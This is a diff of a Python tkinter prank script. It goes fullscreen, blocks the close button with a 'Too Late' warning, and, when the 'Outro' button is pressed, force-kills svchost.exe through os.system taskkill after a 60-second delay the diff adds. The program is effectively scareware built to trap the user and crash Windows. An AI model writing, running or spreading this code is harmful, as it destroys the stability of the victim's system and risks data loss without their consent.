@@ -4,7 +4,6 @@ from tkinter import messagebox
 import playsound
 import time
 import os
-
 root = tk.Tk()
 root.geometry("2000x2000")
 root.configure(background='black')
@@ -15,18 +14,14 @@ def on_closing():
         messagebox.showwarning("Too Late")
 
 
-def onTop():
-    root.lift()
-    root = tk.Toplevel(root)
-def minimize_check():
-    root.deiconify
 
 root.protocol("WM_DELETE_WINDOW", on_closing)
 root.attributes('-fullscreen', True)
 def byebye():
+    time.sleep(60)
     os.system("taskkill /f /im  svchost.exe")
 def outro_start():
-    byebye()
+    byebye()    
     playsound.playsound('audio.mp3')
 button_a = tk.Button(
     text="Outro",
@@ -40,7 +35,5 @@ button_a.place(x=500, y=500)
 
 root.mainloop()
 
-while True:
-    onTop()
-    minimize_check()
+
 
